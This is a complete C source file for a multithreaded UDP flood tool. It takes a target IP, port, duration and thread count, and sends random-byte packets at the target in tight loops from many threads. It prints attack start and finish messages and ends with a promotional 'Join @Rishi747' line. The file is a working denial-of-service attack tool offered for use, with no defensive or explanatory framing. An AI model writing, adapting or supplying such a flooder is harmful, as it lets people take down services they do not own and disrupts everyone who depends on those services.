#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>

#define PAYLOAD_SIZE 1

void generate_payload(char *buffer, size_t size) {
    const char hex_chars[] = "0123456789abcdef";
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = hex_chars[rand() % 16];
        buffer[i * 4 + 3] = hex_chars[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

void *attack_thread(void *arg) {
    char *ip = ((char **)arg)[0];
    int port = atoi(((char **)arg)[1]);
    int duration = atoi(((char **)arg)[2]);

    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    char payload[PAYLOAD_SIZE * 4 + 1];
    generate_payload(payload, PAYLOAD_SIZE);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    endtime = time(NULL) + duration;
    while (time(NULL) <= endtime) {
        ssize_t payload_size = strlen(payload);
        if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    return NULL;
}

void handle_sigint(int sig) {
    printf("\nStopping attack...\n");
    exit(0);
}

void usage() {
    printf("Usage: ./rishi ip port duration threads\n");
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    signal(SIGINT, handle_sigint);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    if (thread_ids == NULL) {
        perror("Memory allocation failed for thread IDs");
        exit(1);
    }

    char *args[3] = {ip, argv[2], argv[3]};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack_thread, args) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Launched thread with ID: %ld\n", (long)thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished. Join @Rishi747\n");
    return 0;
}
